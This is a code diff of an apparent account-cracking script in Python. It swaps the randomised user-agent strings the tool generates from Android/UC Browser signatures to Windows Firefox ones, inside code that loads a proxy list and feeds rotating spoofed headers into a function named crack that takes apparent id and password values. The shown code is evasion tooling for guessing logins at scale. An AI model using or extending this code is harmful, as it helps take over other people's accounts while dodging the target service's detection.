@@ -61,19 +61,19 @@ except Exception as e:
 prox=open('.prox.txt','r').read().splitlines()
 #os.system('rm -rf .prox.txt')
 for jiah in range(1000):
- aa='Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build'
+ aa='Mozilla/5.0 (Windows NT 10.0'
  b=random.choice(['6','7','8','9','10','11','12'])
- c='HUAWEIEML-AL00'
+ c='Windows NT'
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(100, 9999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 # g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
- g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN'
+ g='rv:43.0) Gecko/20100101 Firefox/43.0'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
- l='Safari/537.36'
+ l='Firefox/43.0'
  uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 # uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uaku2)
@@ -709,7 +709,7 @@ def crack(idf,pwv,nmf):
         try:
 			
             ua = random.choice(ugen)
-            #secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
+            #secua=re.findall(' Chrome/(.*?)Gecko/20100101 Firefox/43.0',str(ua))[0].split('.')[0]
             head1={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 'accept-language': 'en-US,en;q=0.9',
 'cache-control': 'max-age=0',
